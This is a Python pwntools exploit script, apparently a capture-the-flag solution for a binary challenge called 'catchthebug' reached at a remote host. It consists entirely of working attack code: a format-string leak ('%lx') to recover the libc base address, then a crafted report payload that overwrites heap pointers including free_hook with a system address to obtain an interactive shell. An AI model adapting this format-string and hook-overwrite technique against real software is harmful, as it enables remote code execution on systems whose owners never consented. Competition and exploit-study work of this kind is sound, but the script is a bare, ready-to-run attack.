from pwn import *

context.log_level = 'debug'

length = 0
p = process('./bug_3e99623da36874fd424a4e237866e301d292aa66',
        env = {'LD_PRELOAD': os.path.join(os.path.abspath(os.path.dirname(__file__)),'disable-alarm/libhook.so')},
        aslr=False)
p = remote('catchthebug.eatpwnnosleep.com', 55555)
header = {
    " / `._                     _": 0x1fe,
    "          /x\\       /x\\                ": 0x1b8,
    "  ((((c,               ,7))))  ": 0x1c0,
}

libc_base = None

def read_banner():
    p.recvuntil(">> ")

def find_buglen(bug):
    for k, v in header.items():
        if k in bug:
            return v
    raise ValueError('fail..')

def catch_bug(name):
    global length
    while True:
        read_banner()
        p.send("1\n")
        name = name.ljust(4)
        p.recvuntil("...\n")
        r = p.readline()
        if "There is no bug =(" in r:
            continue
        bug = p.recvuntil(">> ")
        length += find_buglen(bug)
        p.send(name)
        break

def inspect_bug():
    read_banner()
    p.send("2\n")

def report():
    global length
    read_banner()
    p.send("3\n")

    p.recvuntil("Report title\n")
    p.send("A" * 64)
    p.recvuntil("Report subtitle\n")
    p.send("A" * 128)

    p1 = libc_base + 0x3dbd40 # initial
    p2 = libc_base + 0x3DC8A8 # free_hook

    p.recvuntil("Report body\n")
    print("p1: %x, p2: %x" % (p1, p2))
    payload = "A" * (0x708 - length - 8 * 3 - 64 - 128) + p64(p1) + p64(p2)
    payload = "A" * (0x708 - length - 8 * 3 - 64 - 128) + p64(p1 - len(payload) - 1) + p64(p2)
    raw_input("gogo\n")
    p.send(payload + "\n")
    p.recvuntil("Report tag\n")

    p.send(p64(libc_base + 0x3DA90D)) # any writable address

    p.recvuntil("Report password\n")
    system = libc_base + 0xfccde
    p.send(p64(system))
    p.interactive()

catch_bug("%lx")
catch_bug("%lx")
catch_bug("%lx")

read_banner()
p.send("2\n")
p.readline()
r = p.readline()
off = 0x3db7a3
#    off = 0x3c56a3
libc_base = int(r, 16) - off
print("LIBC_BASE: %x" % libc_base)

one_gadget = libc_base + 0x4526a
inspect_bug()

report()

p.interactive()

